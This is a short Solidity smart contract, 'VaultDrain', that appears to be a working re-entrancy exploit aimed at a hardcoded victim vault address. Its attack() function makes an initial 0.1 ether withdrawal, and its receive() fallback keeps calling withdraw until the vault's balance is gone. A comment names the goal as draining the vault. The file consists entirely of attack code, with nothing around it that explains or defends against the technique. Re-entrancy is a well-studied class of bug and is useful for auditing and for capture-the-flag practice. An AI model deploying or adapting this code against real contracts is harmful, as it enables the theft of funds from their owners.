// SPDX_LISENCE_IDENTIFIER: MIT
pragma solidity ^0.8.6;
interface Vault {
    function withdraw(uint256 _amount) external;
}

contract VaultDrain { // 0xb8D9b217490fd9A5026a4312c805A7723D2a1cC2
    address public immutable victim = 0xcf76B6324A20a432eb695ABDd5820bfBcdd34Bfd;
    uint256 internal constant INITIAL_WITHDRAWAL = 0.1 ether;
    function attack() public {
        Vault(victim).withdraw(INITIAL_WITHDRAWAL);
    }
    // use re-entrancy to drain the vault
    receive() external payable {
        uint256 balance = address(victim).balance;
        uint256 withdrawal = balance > INITIAL_WITHDRAWAL ? INITIAL_WITHDRAWAL : balance;
        if (withdrawal == 0) return;
        Vault(victim).withdraw(withdrawal);
    }
}